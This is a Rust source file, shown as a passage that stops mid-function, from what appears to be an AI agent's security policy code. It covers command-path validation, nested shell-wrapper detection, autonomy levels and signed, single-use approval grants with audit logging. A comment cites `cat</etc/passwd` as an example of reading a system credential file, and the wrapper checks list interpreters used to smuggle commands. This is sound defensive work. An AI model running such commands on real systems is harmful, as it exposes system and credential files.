use crate::security::audit::redact_secrets;
use parking_lot::Mutex;
use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sha2::Digest;
use std::path::{Path, PathBuf};
use std::time::Instant;

pub const PERSISTED_APPROVAL_GRANT_TTL_SECS: i64 = 24 * 60 * 60;

fn is_env_assignment(word: &str) -> bool {
    word.contains('=') && word.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
}

enum CommandPathViolation {
    Forbidden(String),
    Dynamic(String),
    ActiveSubstitution,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ShellLexTokenKind {
    Word,
    Redirection,
    CommandSeparator,
}

struct ShellLexToken {
    text: String,
    kind: ShellLexTokenKind,
    dynamic: bool,
    active_substitution: bool,
}

const MAX_NESTED_SHELL_VALIDATION_DEPTH: usize = 4;

fn forbidden_path_argument(policy: &SecurityPolicy, command: &str) -> Option<CommandPathViolation> {
    forbidden_path_argument_inner(policy, command, 0)
}

fn forbidden_path_argument_inner(policy: &SecurityPolicy, command: &str, depth: usize) -> Option<CommandPathViolation> {
    let folded_command = fold_shell_line_continuations(command);
    for segment in split_unquoted_segments(&folded_command) {
        let tokens = shell_words_and_redirections(&segment);
        let mut index = 0;
        while index < tokens.len() {
            while tokens
                .get(index)
                .is_some_and(|token| token.kind == ShellLexTokenKind::CommandSeparator)
            {
                index += 1;
            }
            while tokens.get(index).is_some_and(|token| {
                token.kind == ShellLexTokenKind::Word && !token.active_substitution && is_env_assignment(&token.text)
            }) {
                index += 1;
            }
            let Some(executable) = tokens.get(index) else {
                break;
            };
            if executable.kind == ShellLexTokenKind::CommandSeparator {
                continue;
            }
            if executable.active_substitution {
                return Some(CommandPathViolation::ActiveSubstitution);
            }
            if executable.dynamic {
                return Some(CommandPathViolation::Dynamic(executable.text.clone()));
            }
            let benign_dynamic_arguments = allows_benign_dynamic_arguments(&executable.text);
            index += 1;
            let arguments_start = index;
            let mut expects_redirection_operand = false;

            while let Some(token) = tokens.get(index) {
                if token.kind == ShellLexTokenKind::CommandSeparator {
                    break;
                }
                if token.active_substitution {
                    return Some(CommandPathViolation::ActiveSubstitution);
                }
                if token.kind == ShellLexTokenKind::Redirection {
                    expects_redirection_operand = true;
                    index += 1;
                    continue;
                }
                if token.dynamic
                    && (expects_redirection_operand || token.text.contains('/') || !benign_dynamic_arguments)
                {
                    return Some(CommandPathViolation::Dynamic(token.text.clone()));
                }
                expects_redirection_operand = false;
                let candidate = token.text.as_str();
                if candidate.is_empty() || candidate.starts_with('-') || candidate.contains("://") {
                    index += 1;
                    continue;
                }
                let looks_like_path = candidate.starts_with('/')
                    || candidate.starts_with("./")
                    || candidate.starts_with("../")
                    || candidate.starts_with("~/")
                    || (candidate.contains('/') && !candidate.chars().any(char::is_whitespace));
                if looks_like_path && !policy.is_path_allowed(candidate) {
                    return Some(CommandPathViolation::Forbidden(candidate.to_string()));
                }
                index += 1;
            }
            if let Some(violation) = nested_wrapper_violation(
                policy,
                &executable.text,
                tokens.get(arguments_start..index).unwrap_or_default(),
                depth,
            ) {
                return Some(violation);
            }
            if tokens
                .get(index)
                .is_some_and(|token| token.kind == ShellLexTokenKind::CommandSeparator)
            {
                index += 1;
            }
        }
    }
    None
}

fn shell_command_basename(executable: &str) -> &str {
    executable.rsplit(['/', '\\']).next().unwrap_or(executable)
}

fn allows_benign_dynamic_arguments(executable: &str) -> bool {
    matches!(shell_command_basename(executable), "echo" | "printf" | "sleep")
}

fn nested_wrapper_violation(
    policy: &SecurityPolicy,
    executable: &str,
    arguments: &[ShellLexToken],
    depth: usize,
) -> Option<CommandPathViolation> {
    let words = arguments
        .iter()
        .filter(|token| token.kind == ShellLexTokenKind::Word)
        .map(|token| token.text.as_str())
        .collect::<Vec<_>>();
    let base = shell_command_basename(executable);
    let payload = match base {
        "eval" => Some(words.join(" ")),
        "command" => {
            let start = words
                .iter()
                .position(|word| !word.starts_with('-'))
                .unwrap_or(words.len());
            Some(words.get(start..).unwrap_or_default().join(" "))
        }
        "env" => {
            let start = words
                .iter()
                .position(|word| !word.starts_with('-') && !is_env_assignment(word))
                .unwrap_or(words.len());
            Some(words.get(start..).unwrap_or_default().join(" "))
        }
        "sh" | "bash" | "dash" | "zsh" | "ksh" | "fish" => words
            .iter()
            .position(|word| *word == "-c")
            .and_then(|flag| words.get(flag + 1))
            .map(|payload| (*payload).to_string()),
        "python" | "python3" | "perl" | "ruby" | "node" | "php" => {
            let payload = words
                .iter()
                .position(|word| matches!(*word, "-c" | "-e"))
                .and_then(|flag| words.get(flag + 1))?;
            return code_payload_violation(policy, payload);
        }
        _ => None,
    }?;
    if payload.is_empty() {
        return None;
    }
    if depth >= MAX_NESTED_SHELL_VALIDATION_DEPTH {
        return Some(CommandPathViolation::Dynamic(payload));
    }
    forbidden_path_argument_inner(policy, &payload, depth + 1)
}

fn code_payload_violation(policy: &SecurityPolicy, payload: &str) -> Option<CommandPathViolation> {
    if payload.contains('$') {
        return Some(CommandPathViolation::Dynamic(payload.to_string()));
    }
    for candidate in payload
        .split(|character: char| !(character.is_alphanumeric() || matches!(character, '/' | '.' | '_' | '-' | '~')))
    {
        let looks_like_path = candidate.starts_with('/')
            || candidate.starts_with("./")
            || candidate.starts_with("../")
            || candidate.starts_with("~/");
        if looks_like_path && !policy.is_path_allowed(candidate) {
            return Some(CommandPathViolation::Forbidden(candidate.to_string()));
        }
    }
    None
}

/// Tokenize one already-separated shell segment into quote-aware words and
/// unquoted redirection operators. Redirections are emitted as their own token
/// even when attached to a command/operand (`cat</etc/passwd`), while `<`/`>`
/// inside quotes remain literal word content.
fn shell_words_and_redirections(segment: &str) -> Vec<ShellLexToken> {
    let mut tokens = Vec::new();
    let mut word = String::new();
    let mut word_dynamic = false;
    let mut word_active_substitution = false;
    let mut quote = QuoteState::None;
    let mut chars = segment.chars().peekable();

    let flush_word =
        |tokens: &mut Vec<ShellLexToken>, word: &mut String, dynamic: &mut bool, active_substitution: &mut bool| {
            if !word.is_empty() {
                tokens.push(ShellLexToken {
                    text: std::mem::take(word),
                    kind: ShellLexTokenKind::Word,
                    dynamic: *dynamic,
                    active_substitution: *active_substitution,
                });
                *dynamic = false;
                *active_substitution = false;
            }
        };

    while let Some(ch) = chars.next() {
        match quote {
            QuoteState::Single => {
                if ch == '\'' {
                    quote = QuoteState::None;
                } else {
                    word.push(ch);
                }
            }
            QuoteState::Double => match ch {
                '"' => quote = QuoteState::None,
                '$' => {
                    word_dynamic = true;
                    word_active_substitution |= chars.peek().is_some_and(|next| *next == '(');
                    word.push(ch);
                }
                '`' => {
                    word_active_substitution = true;
                    word.push(ch);
                }
                '\\' => {
                    if let Some(escaped) = chars.next() {
                        word.push(escaped);
                    }
                }
                _ => word.push(ch),
            },
            QuoteState::None => match ch {
                '\'' => quote = QuoteState::Single,
                '"' => quote = QuoteState::Double,
                '\\' => {
                    if let Some(escaped) = chars.next() {
                        word.push(escaped);
                    }
                }
                '$' => {
                    word_dynamic = true;
                    word_active_substitution |= chars.peek().is_some_and(|next| *next == '(');
                    word.push(ch);
                }
                '`' => {
                    word_active_substitution = true;
                    word.push(ch);
                }
                '<' | '>' => {
                    flush_word(&mut tokens, &mut word, &mut word_dynamic, &mut word_active_substitution);
                    tokens.push(ShellLexToken {
                        text: ch.to_string(),
                        kind: ShellLexTokenKind::Redirection,
                        dynamic: false,
                        active_substitution: chars.peek().is_some_and(|next| *next == '('),
                    });
                }
                '&' => {
                    flush_word(&mut tokens, &mut word, &mut word_dynamic, &mut word_active_substitution);
                    tokens.push(ShellLexToken {
                        text: ch.to_string(),
                        kind: ShellLexTokenKind::CommandSeparator,
                        dynamic: false,
                        active_substitution: false,
                    });
                }
                _ if ch.is_whitespace() => {
                    flush_word(&mut tokens, &mut word, &mut word_dynamic, &mut word_active_substitution)
                }
                _ => word.push(ch),
            },
        }
    }
    flush_word(&mut tokens, &mut word, &mut word_dynamic, &mut word_active_substitution);
    tokens
}

fn contains_active_shell_substitution(command: &str) -> bool {
    shell_words_and_redirections(command)
        .iter()
        .any(|token| token.active_substitution)
}

/// How much autonomy the agent has
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "lowercase")]
pub enum AutonomyLevel {
    /// Read-only: can observe but not act
    ReadOnly,
    /// Supervised: acts but requires approval for risky operations
    Supervised,
    /// Full: autonomous execution within policy bounds
    #[default]
    Full,
}

/// Risk score for shell command execution.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandRiskLevel {
    Low,
    Medium,
    High,
}

/// Risk score for non-command state/resource mutations.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ResourceRiskLevel {
    Low,
    Medium,
    High,
}

/// Classifies whether a tool operation is read-only or side-effecting.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ToolOperation {
    Read,
    Act,
}

/// Unified tool-authorization decision produced by [`SecurityPolicy::decide`].
///
/// Permission-model Phase 1: this is the single decision point that replaces the
/// former scattered logic (PolicyPipeline + ApprovalManager lists +
/// SideEffectGate allowlists). `decide` returns one of three coarse outcomes
/// driven solely by the autonomy level and a read-only/side-effect split:
///
/// * `Allow` — run immediately, no prompt, no grant.
/// * `Ask`   — route through the [`crate::approval::ApprovalManager`] + a
///   single-use `ApprovalGrantV2` (supervised side-effecting tools).
/// * `Deny`  — reject (scope ACL denial, or read_only blocking a side-effecting
///   tool).
///
/// Phase 2 will replace the binary read/side-effect split with a 4-tier risk
/// classification + per-risk action table.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ToolDecision {
    Allow,
    Ask,
    Deny,
}

/// Phase 1 read-only tool name list — the **single source of truth** for the
/// "no side effects" classification.
///
/// These tools have no side effects, so they are always `Allow`ed (even under
/// `read_only`) and never require approval. Both the unified [`decide`] entry
/// point (via [`is_read_only_tool`]) and the agent loop's parallel scheduler
/// classify read-only tools through this one list, so the two can never drift.
/// Phase 2 replaces this hard-coded list with the dynamic
/// [`ToolOperation::Read`] / risk classification driven by the `Tool` trait.
/// Keep this conservative: only genuinely observational tools belong here, and
/// every entry must be a real registered tool name.
///
/// [`decide`]: SecurityPolicy::decide
pub const READ_ONLY_TOOLS: &[&str] = &[
    // Filesystem / memory reads.
    "file_read",
    "memory_recall",
    "memory_search",
    "memory_get",
    // Document retrieval (RAG) reads.
    "document_search",
    "document_get_chunk",
    // Web reads.
    "web_fetch",
    "web_search_tool",
    // Media inspection (metadata only, no mutation).
    "image_info",
    // Session / cron / agent introspection.
    "sessions_list",
    "sessions_history",
    "session_status",
    "agents_list",
    // Hardware introspection (read board info / memory / registers only).
    "hardware_board_info",
    "hardware_memory_map",
    "hardware_memory_read",
];

/// Returns `true` when `tool_name` is a Phase 1 read-only (no-side-effect) tool.
#[must_use]
pub fn is_read_only_tool(tool_name: &str) -> bool {
    READ_ONLY_TOOLS.contains(&tool_name)
}

/// Runtime-only tool argument injected after an approval manager grants a call.
///
/// User/model supplied copies of this field must be stripped by the tool-call
/// loop before execution. Tools read this instead of trusting public
/// `approved=true` parameters.
pub const RUNTIME_APPROVAL_GRANTED_ARG: &str = "_zc_approval_granted";
pub const RUNTIME_APPROVAL_GRANT_ARG: &str = "_zc_approval_grant";

/// Process-level single-use ledger for v2 approval grants (threat M5: replay
/// inside the 60s validity window).
///
/// The [`SideEffectGate`] is synchronous and holds no store/DB handle (it only
/// borrows a `&SecurityPolicy`), and it operates on a *cloned* grant, so atomic
/// `uses_consumed` persistence at the gate is impossible. Instead, single-use is
/// enforced in-memory: the first successful authorization of a given `grant_id`
/// records its consumed count; once the count reaches `max_uses`, any further
/// authorization of that same grant is denied. The check-and-increment runs
/// under one `parking_lot::Mutex` so it is free of TOCTOU. Entries are lost on
/// restart, which is safe: runtime grants expire within 60s, so a grant issued
/// before a restart is already invalid afterwards.
/// Maximum allowed re-entrancy depth for [`SideEffectGate`] authorizations
/// (threat P3-10). A side effect that, while being authorized, triggers further
/// gate-authorized side effects recurses on the calling thread; without a bound
/// a crafted chain could exhaust the stack or evade per-call accounting.
/// Authorizations nested deeper than this are denied. The limit is per-thread
/// because each `authorize_*` call runs synchronously on the calling thread.
const MAX_GATE_DEPTH: usize = 4;

thread_local! {
    /// Per-thread re-entrancy depth for active [`SideEffectGate`] authorizations.
    /// Incremented on entry to an `authorize_*` call and decremented on exit via
    /// [`GateDepthGuard`]; the guard restores the previous value on drop even if
    /// the authorized operation panics, so the counter can never leak.
    static GATE_DEPTH: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
}

/// RAII guard that increments the per-thread gate depth on construction and
/// restores the previous value on drop. The guard MUST be bound to a variable
/// for the duration of the authorization; the `#[must_use]` attribute makes
/// dropping it immediately (which would leak an increment with no matching
/// decrement) a compile-time lint.
#[must_use = "GateDepthGuard must be held for the authorization scope; dropping it immediately leaks gate depth"]
struct GateDepthGuard;

impl GateDepthGuard {
    /// Increment the per-thread gate depth and return the guard. Bind it to a
    /// local (`let _guard = GateDepthGuard::enter();`) so the increment is
    /// undone when the authorization scope ends. Read the resulting depth with
    /// [`GateDepthGuard::current_depth`].
    fn enter() -> Self {
        GATE_DEPTH.with(|d| d.set(d.get().saturating_add(1)));
        Self
    }

    /// Current per-thread gate depth (number of active guards on this thread).
    fn current_depth() -> usize {
        GATE_DEPTH.with(std::cell::Cell::get)
    }
}

impl Drop for GateDepthGuard {
    fn drop(&mut self) {
        GATE_DEPTH.with(|d| d.set(d.get().saturating_sub(1)));
    }
}

static CONSUMED_V2_GRANTS: std::sync::LazyLock<Mutex<std::collections::HashMap<String, u32>>> =
    std::sync::LazyLock::new(|| Mutex::new(std::collections::HashMap::new()));

/// Atomically record one use of v2 grant `grant_id` (max `max_uses`).
///
/// Returns `true` if the use was consumed (caller may proceed) or `false` if the
/// grant is already exhausted (replay → deny). `max_uses == 0` is treated as a
/// grant that can never be consumed. The check-and-increment is performed under a
/// single lock, so concurrent callers can never both win the last slot.
#[must_use]
fn try_consume_v2_grant(grant_id: &str, max_uses: u32) -> bool {
    if max_uses == 0 {
        return false;
    }
    let mut ledger = CONSUMED_V2_GRANTS.lock();
    let used = ledger.entry(grant_id.to_string()).or_insert(0);
    if *used >= max_uses {
        return false;
    }
    *used = used.saturating_add(1);
    true
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ApprovalGrant {
    pub tool: String,
    pub operation_hash: Option<u64>,
    /// P3-07: SHA-256 (256-bit) hex digest of the bound operation. Preferred
    /// over the 64-bit `operation_hash` when present; the wider digest makes a
    /// second-preimage (forging a different command that hashes the same)
    /// computationally infeasible. `#[serde(default)]` + `skip_serializing_if`
    /// so v1 grants persisted before this field existed still deserialize (d08
    /// backward compatibility) and v1-only grants serialize unchanged.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub operation_hash_v2: Option<String>,
    pub actor: String,
    pub scope: Option<String>,
    pub expires_at_epoch_secs: Option<i64>,
    #[serde(default)]
    pub v2: Option<crate::acl::approval_grant::ApprovalGrantV2>,
    /// In-process trust flag. NEVER serialized: a grant that crosses a trust
    /// boundary (the `_zc_approval_grant` JSON arg) must be re-verified by the
    /// gate against the witness keyring before it is honoured. `#[serde(skip)]`
    /// guarantees this flag is always `false` after deserialization, closing the
    /// forged-`v2_verified` injection hole.
    #[serde(skip)]
    pub v2_verified: bool,
    /// Trusted caller principal id, derived from the runtime scope at the gate
    /// (threat M4: cross-tenant grant reuse). Never serialized; populated by
    /// [`ApprovalGrant::from_runtime_args`] from the trusted `_zc_scope` payload.
    #[serde(skip)]
    pub caller_principal_id: Option<String>,
}

impl ApprovalGrant {
    #[must_use]
    pub fn for_tool(tool: impl Into<String>, actor: impl Into<String>, scope: Option<String>) -> Self {
        Self {
            tool: tool.into(),
            operation_hash: None,
            // for_tool carries no operation binding at all; both digests stay None.
            operation_hash_v2: None,
            actor: actor.into(),
            scope,
            expires_at_epoch_secs: None,
            v2: None,
            v2_verified: false,
            caller_principal_id: None,
        }
    }

    #[must_use]
    pub fn for_command(
        tool: impl Into<String>,
        command: &str,
        actor: impl Into<String>,
        scope: Option<String>,
    ) -> Self {
        let tool = tool.into();
        Self {
            operation_hash: Some(command_operation_hash(&tool, command)),
            // P3-07: also bind the wide 256-bit digest; verification prefers it.
            operation_hash_v2: Some(command_operation_hash_v2(&tool, command)),
            tool,
            actor: actor.into(),
            scope,
            expires_at_epoch_secs: None,
            v2: None,
            v2_verified: false,
            caller_principal_id: None,
        }
    }

    #[must_use]
    pub fn for_resource_operation(
        tool: impl Into<String>,
        operation: &str,
        actor: impl Into<String>,
        scope: Option<String>,
    ) -> Self {
        let tool = tool.into();
        Self {
            operation_hash: Some(resource_operation_hash(&tool, operation)),
            // P3-07: also bind the wide 256-bit digest; verification prefers it.
            operation_hash_v2: Some(resource_operation_hash_v2(&tool, operation)),
            tool,
            actor: actor.into(),
            scope,
            expires_at_epoch_secs: None,
            v2: None,
            v2_verified: false,
            caller_principal_id: None,
        }
    }

    /// Wrap a v2 grant that has already been verified *in-process* by the
    /// issuer (the agent loop signs the grant and immediately verifies its own
    /// signature before injection). The gate ALWAYS re-verifies the signature
    /// against the keyring before honouring it, so `v2_verified` is only a
    /// fast-path hint for the same-process call, never a trust source across the
    /// serialization boundary (the field is `#[serde(skip)]`).
    #[must_use]
    pub fn from_verified_v2(
        tool: impl Into<String>,
        actor: impl Into<String>,
        grant: crate::acl::approval_grant::ApprovalGrantV2,
    ) -> Self {
        Self {
            tool: tool.into(),
            operation_hash: None,
            // v2 cryptographic grants carry their own op-id binding inside the
            // signed ApprovalGrantV2; the v1 hash fields are unused for them.
            operation_hash_v2: None,
            actor: actor.into(),
            scope: Some(grant.grant_id.clone()),
            expires_at_epoch_secs: Some(grant.expires_at.timestamp()),
            v2: Some(grant),
            v2_verified: true,
            caller_principal_id: None,
        }
    }

    /// Attach the trusted caller principal id (for the M4 cross-tenant check).
    #[must_use]
    pub fn with_caller_principal_id(mut self, principal_id: Option<String>) -> Self {
        self.caller_principal_id = principal_id;
        self
    }

    #[must_use]
    pub fn persisted_for_command(
        tool: impl Into<String>,
        command: &str,
        actor: impl Into<String>,
        scope: Option<String>,
        ttl_secs: i64,
    ) -> Self {
        let mut grant = Self::for_command(tool, command, actor, scope);
        grant.expires_at_epoch_secs = Some(chrono::Utc::now().timestamp() + ttl_secs.max(1));
        grant
    }

    #[must_use]
    pub fn persisted_runner_grant(
        runner_tool: impl Into<String>,
        command: &str,
        source: Option<&Self>,
        ttl_secs: i64,
    ) -> Option<Self> {
        source.map(|grant| {
            Self::persisted_for_command(runner_tool, command, grant.actor.clone(), grant.scope.clone(), ttl_secs)
        })
    }

    #[must_use]
    pub fn from_runtime_args(tool_name: &str, args: &Value) -> Option<Self> {
        let _ = tool_name;
        let grant_value = args.get(RUNTIME_APPROVAL_GRANT_ARG)?;
        // `v2_verified` and `caller_principal_id` are `#[serde(skip)]`, so a
        // grant reconstructed from the wire always starts unverified — the gate
        // must re-verify the v2 signature itself.
        let mut grant = serde_json::from_value::<Self>(grant_value.clone()).ok()?;
        // Bind the M4 caller principal from the trusted scope payload. We only
        // trust `_zc_scope` when the runtime marked it trusted; user/model
        // supplied scopes are ignored.
        if args.get("_zc_scope_trusted").and_then(Value::as_bool).unwrap_or(false) {
            grant.caller_principal_id = args
                .get("_zc_scope")
                .and_then(Value::as_object)
                .and_then(|scope| caller_principal_from_scope(scope));
        }
        Some(grant)
    }

    // P3-07: the v1/v2 digest fallback reads clearest as an explicit
    // Option::map_or_else; clippy's `option_if_let_else` (nursery) loops on the
    // nested `is_some_and` closure, so it is scoped-allowed here.
    #[allow(clippy::option_if_let_else)]
    #[must_use]
    pub fn permits_command(&self, tool_name: &str, command: &str, risk: CommandRiskLevel, now_epoch_secs: i64) -> bool {
        if self.tool != tool_name {
            return false;
        }
        if self.v2.is_some() {
            return self.verify_v2(command, command_risk_to_acl(risk));
        }
        if self
            .expires_at_epoch_secs
            .is_some_and(|expires_at| expires_at <= now_epoch_secs)
        {
            return false;
        }
        // Tightened default (d08 §0 / M1): an operation with no precise binding
        // is denied. P3-07: prefer the 256-bit v2 digest when present; fall back
        // to the 64-bit v1 digest for grants minted before v2 existed (d08
        // compatibility). A grant with neither digest is unbound → denied.
        match &self.operation_hash_v2 {
            Some(expected_v2) => expected_v2.as_str() == command_operation_hash_v2(tool_name, command),
            None => self
                .operation_hash
                .map(|hash| hash == command_operation_hash(tool_name, command))
                .unwrap_or(false),
        }
    }

    // See `permits_command`: scoped-allow the nursery `option_if_let_else` that
    // loops on the v1/v2 digest fallback's `is_some_and` closure.
    #[allow(clippy::option_if_let_else)]
    #[must_use]
    pub fn permits_resource_operation(
        &self,
        tool_name: &str,
        operation: &str,
        risk: ResourceRiskLevel,
        now_epoch_secs: i64,
    ) -> bool {
        if self.tool != tool_name {
            return false;
        }
        if self.v2.is_some() {
            return self.verify_v2(operation, resource_risk_to_acl(risk));
        }
        if self
            .expires_at_epoch_secs
            .is_some_and(|expires_at| expires_at <= now_epoch_secs)
        {
            return false;
        }
        // P3-07: prefer the 256-bit v2 digest; fall back to v1 (see permits_command).
        self.operation_hash_v2.as_ref().map_or_else(
            || {
                self.operation_hash
                    .is_some_and(|hash| hash == resource_operation_hash(tool_name, operation))
            },
            |expected_v2| expected_v2.as_str() == resource_operation_hash_v2(tool_name, operation),
        )
    }

    /// Authoritative v2 verification for the gate. Re-verifies the witness
    /// signature against the process keyring (never trusts the wire
    /// `v2_verified` flag), enforces the time window / revocation / use budget /
    /// op-id+risk match, and binds the grant to the trusted caller principal
    /// (threat M4). Returns `false` on any failure.
    #[must_use]
    fn verify_v2(&self, op_id: &str, risk: crate::acl::approval_grant::RiskLevel) -> bool {
        self.verify_v2_detailed(op_id, risk).is_ok()
    }

    /// Like [`Self::verify_v2`] but returns the *specific* rejection reason on
    /// failure (cross-tenant principal mismatch / expired / revoked / single-use
    /// exhausted / signature verification failure / missing v2 grant). Used only
    /// for compliance audit logging (EU AI Act Art.12 traceability); the gate's
    /// caller-facing error stays generic so it never leaks verification internals.
    fn verify_v2_detailed(&self, op_id: &str, risk: crate::acl::approval_grant::RiskLevel) -> Result<(), String> {
        let Some(grant) = self.v2.as_ref() else {
            return Err("missing v2 grant".to_string());
        };
        let keyring = match crate::acl::approval_grant::WitnessKeyring::global() {
            Ok(keyring) => keyring,
            Err(error) => {
                tracing::error!("witness keyring unavailable; denying v2 grant: {error}");
                return Err("witness keyring unavailable".to_string());
            }
        };
        grant
            .verify_for_operation_bound(
                keyring,
                op_id,
                risk,
                self.caller_principal_id.as_deref(),
                chrono::Utc::now(),
            )
            .map_err(|error| {
                tracing::warn!(op_id = %op_id, "v2 approval grant rejected: {error}");
                error.to_string()
            })
    }

    /// Stable grant identifier for audit correlation: the v2 `grant_id` when
    /// present, otherwise the v1 `scope` (which carries the grant id for
    /// `from_verified_v2`-wrapped grants). `None` for unbound v1 grants.
    #[must_use]
    pub fn audit_grant_id(&self) -> Option<&str> {
        self.v2
            .as_ref()
            .map(|grant| grant.grant_id.as_str())
            .or(self.scope.as_deref())
    }

    /// Trusted caller principal bound at the gate (threat M4), for audit subject
    /// attribution. `None` when no principal context is available.
    #[must_use]
    pub fn audit_principal_id(&self) -> Option<&str> {
        self.caller_principal_id.as_deref()
    }

    /// Single-use key for the in-memory consumption ledger (threat M5): the v2
    /// `grant_id` and its `max_uses`. `None` for legacy v1 grants, which carry no
    /// signed use budget and are not subject to the gate's replay ledger.
    #[must_use]
    fn v2_single_use_key(&self) -> Option<(&str, u32)> {
        self.v2.as_ref().map(|grant| (grant.grant_id.as_str(), grant.max_uses))
    }

    /// Precise deny reason for a command decision when this grant did not
    /// authorize, for compliance audit logging. `None` when it did authorize.
    #[must_use]
    fn command_deny_reason(&self, tool_name: &str, command: &str, risk: CommandRiskLevel, now: i64) -> Option<String> {
        if self.permits_command(tool_name, command, risk, now) {
            return None;
        }
        Some(self.deny_reason_for(tool_name, command, command_risk_to_acl(risk), now))
    }

    /// Precise deny reason for a resource operation, mirroring [`Self::command_deny_reason`].
    #[must_use]
    fn resource_deny_reason(
        &self,
        tool_name: &str,
        operation: &str,
        risk: ResourceRiskLevel,
        now: i64,
    ) -> Option<String> {
        if self.permits_resource_operation(tool_name, operation, risk, now) {
            return None;
        }
        Some(self.deny_reason_for(tool_name, operation, resource_risk_to_acl(risk), now))
    }

    /// Classify *why* this grant fails to authorize, mirroring the branch order
    /// of [`Self::permits_command`] / [`Self::permits_resource_operation`].
    fn deny_reason_for(
        &self,
        tool_name: &str,
        op_id: &str,
        risk: crate::acl::approval_grant::RiskLevel,
        now: i64,
    ) -> String {
        if self.tool != tool_name {
            return format!("grant tool mismatch (grant={}, requested={tool_name})", self.tool);
        }
        if self.v2.is_some() {
            return match self.verify_v2_detailed(op_id, risk) {
                Ok(()) => "v2 risk/op mismatch".to_string(),
                Err(reason) => reason,
            };
        }
        if self.expires_at_epoch_secs.is_some_and(|expires_at| expires_at <= now) {
            return "grant expired".to_string();
        }
        // P3-07: a v2 digest counts as a precise binding; only when BOTH digests
        // are absent is the grant unbound. (`op_id` here is the resolved op/command.)
        if self.operation_hash.is_none() && self.operation_hash_v2.is_none() {
            return "no precise operation binding (operation_hash=None)".to_string();
        }
        let _ = op_id;
        "operation hash mismatch".to_string()
    }
}

/// Extract the caller principal id from a trusted `_zc_scope` object.
///
/// Prefers an explicit `principal_id`; otherwise derives the canonical
/// `{channel}:{sender}` form via [`OwnerPrincipal`], matching how grants are
/// issued in the agent loop.
fn caller_principal_from_scope(scope: &serde_json::Map<String, Value>) -> Option<String> {
    if let Some(principal_id) = scope
        .get("principal_id")
        .and_then(Value::as_str)
        .map(str::trim)
        .filter(|value| !value.is_empty())
    {
        return Some(principal_id.to_string());
    }
    let channel = scope.get("channel").and_then(Value::as_str).unwrap_or("");
    let sender = scope.get("sender").and_then(Value::as_str).unwrap_or("");
    if channel.is_empty() && sender.is_empty() {
        return None;
    }
    Some(
        crate::memory::principal::OwnerPrincipal::new(
            scope.get("workspace_id").and_then(Value::as_str).unwrap_or("local"),
            channel,
            sender,
            scope.get("chat_id").and_then(Value::as_str).unwrap_or("session"),
            vec![crate::memory::principal::Role::Anonymous],
        )
        .principal_id,
    )
}

const fn command_risk_to_acl(risk: CommandRiskLevel) -> crate::acl::approval_grant::RiskLevel {
    match risk {
        CommandRiskLevel::Low => crate::acl::approval_grant::RiskLevel::Low,
        CommandRiskLevel::Medium => crate::acl::approval_grant::RiskLevel::Medium,
        CommandRiskLevel::High => crate::acl::approval_grant::RiskLevel::High,
    }
}

const fn resource_risk_to_acl(risk: ResourceRiskLevel) -> crate::acl::approval_grant::RiskLevel {
    match risk {
        ResourceRiskLevel::Low => crate::acl::approval_grant::RiskLevel::Low,
        ResourceRiskLevel::Medium => crate::acl::approval_grant::RiskLevel::Medium,
        ResourceRiskLevel::High => crate::acl::approval_grant::RiskLevel::High,
    }
}

#[derive(Debug, Clone, Copy)]
pub struct SideEffectGate<'a> {
    policy: &'a SecurityPolicy,
}

impl<'a> SideEffectGate<'a> {
    #[must_use]
    pub const fn new(policy: &'a SecurityPolicy) -> Self {
        Self { policy }
    }

    pub fn authorize_command_execution(
        self,
        tool_name: &str,
        command: &str,
        grant: Option<&ApprovalGrant>,
    ) -> Result<CommandRiskLevel, String> {
        // P3-10: bound gate re-entrancy depth. The guard restores the previous
        // depth on every return path (including the deny below) because it is
        // dropped at end of scope.
        let _depth_guard = GateDepthGuard::enter();
        if GateDepthGuard::current_depth() > MAX_GATE_DEPTH {
            return Err(format!(
                "side-effect gate re-entrancy depth exceeded (max {MAX_GATE_DEPTH})"
            ));
        }
        let now = chrono::Utc::now().timestamp();
        let command_risk = self.policy.command_risk_level(command);
        let runtime_approval_granted =
            grant.is_some_and(|grant| grant.permits_command(tool_name, command, command_risk, now));
        let mut result = self
            .policy
            .validate_command_execution(command, runtime_approval_granted);
        // M5 replay defense: when a v2 grant actually authorized this allowed
        // command, atomically consume one use. If the grant is already exhausted
        // (single-use replayed inside the 60s window, or a concurrent caller won
        // the slot) flip the decision to Deny. Consumption happens exactly once,
        // only on the real allow path (never during deny-reason computation).
        if result.is_ok() && runtime_approval_granted {
            if let Some((grant_id, max_uses)) = grant.and_then(ApprovalGrant::v2_single_use_key) {
                if !try_consume_v2_grant(grant_id, max_uses) {
                    result = Err("approval grant single-use exhausted (replay)".to_string());
                }
            }
        }
        let risk_label = result.as_ref().map_or_else(
            |_| "unknown".to_string(),
            |risk| format!("{risk:?}").to_ascii_lowercase(),
        );
        // Compliance audit (EU AI Act Art.12): record subject + grant id + the
        // *specific* deny reason. When a grant was presented but did not
        // authorize, prefer its precise rejection cause (expired / revoked /
        // single-use / cross-tenant / hash mismatch / no-binding) over the
        // generic gate error, so the trail is forensically usable.
        let grant_deny_reason = match (result.as_ref(), grant) {
            (Err(_), Some(grant)) => grant.command_deny_reason(tool_name, command, command_risk, now),
            _ => None,
        };
        let audit_reason = grant_deny_reason
            .as_deref()
            .or_else(|| result.as_ref().err().map(String::as_str));
        crate::security::audit::record_side_effect_decision_best_effort(
            &self.policy.workspace_dir,
            &self.policy.audit_config,
            crate::security::audit::SideEffectDecisionLog {
                tool_name,
                operation_name: command,
                risk_level: &risk_label,
                approved: runtime_approval_granted,
                allowed: result.is_ok(),
                error: audit_reason,
                principal_id: grant.and_then(ApprovalGrant::audit_principal_id),
                grant_id: grant.and_then(ApprovalGrant::audit_grant_id),
            },
        );
        result
    }

    pub fn authorize_resource_operation(
        self,
        tool_name: &str,
        operation_name: &str,
        risk: ResourceRiskLevel,
        grant: Option<&ApprovalGrant>,
